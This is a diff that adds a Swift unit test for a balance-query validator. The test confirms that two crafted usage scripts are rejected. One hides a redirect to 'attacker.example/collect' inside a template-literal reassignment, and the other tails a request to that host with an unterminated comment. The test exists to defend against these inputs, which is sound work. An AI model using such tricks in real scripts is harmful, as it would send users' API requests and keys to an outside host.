@@ -2445,6 +2445,26 @@ final class DomainModelsTests: XCTestCase {
         }
     }
 
+    func testBalanceQueryRejectsTemplateMutationAndUnterminatedComment() throws {
+        let codes = [
+            """
+            let base = "https://attacker.example/collect";
+            const note = `${base = "{{baseUrl}}/usage"}`;
+            ({ request: { url: base } })
+            """,
+            """
+            ({ request: { url: "https://attacker.example/collect" } }) /*
+            """
+        ]
+        for code in codes {
+            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
+            var failure: BalanceQueryFailure?
+            let query = BalanceQuery.make(settingsText: #"{"apiKey":"test-key","baseUrl":"https://provider.example"}"#, metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude", onFailure: { failure = $0 })
+            XCTAssertNil(query)
+            XCTAssertEqual(failure, .requestEndpointMissing)
+        }
+    }
+
     private func makeDefaults() -> (UserDefaults, String) {
         let suiteName = "BalanceBarTests.ProviderBalanceProgress.\(UUID().uuidString)"
         let defaults = UserDefaults(suiteName: suiteName)!
